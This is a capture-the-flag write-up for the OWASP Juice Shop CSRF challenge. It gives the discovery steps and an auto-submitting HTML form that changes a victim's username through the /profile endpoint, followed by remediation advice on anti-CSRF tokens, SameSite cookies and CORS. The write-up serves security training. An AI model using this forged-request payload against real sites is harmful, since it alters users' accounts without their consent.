# Juice Shop Write-up: CSRF Challenge

## Challenge Details

**Difficulty** : ✯✯✯.\
**Category** : Broken Access Control

**Description**

- Change the name of a user by performing Cross-Site Request Forgery from another origin.
- This challenge involves executing a Cross-Site Request Forgery (CSRF) attack to change the name of a user on the OWASP Juice Shop platform without their consent.
  
## Solution

- **Endpoint Discovery** : Examine HTTP requests made while changing the username through the application’s profile page.
  
- **CSRF Payload** : Create an HTML page that includes an auto-submitting form directed at the vulnerable endpoint, use hidden form fields to set the desired new username value.

  ```html
   <html>
   <body>
     <form action="http://[IP]:[port]/profile" method="POST">
       <input type="hidden" name="username" value="HAcked" />
     </form>
     <script>document.forms[0].submit();</script>
   </body>
   </html>
   ```

- Upload the CSRF attack HTML to a publicly accessible or controllable domain such as `http://htmledit.squarefree.com/` to simulate a real attack scenario.
- When the victim visits the malicious page, the script triggers the form submission using the victim's authenticated session, changing the username without the user’s explicit approval.

## Remediation

- **Use Anti-CSRF Tokens**: Ensure that each form submission includes a server-side validated token.
  
- **Adopt Same-Site Cookies**: Configure cookies to be only sent in requests originating from the same site the cookie was set.
  
- **Implement CORS Policies**: Properly configure Cross-Origin Resource Sharing (CORS) policies to restrict resources to trusted domains only.

  
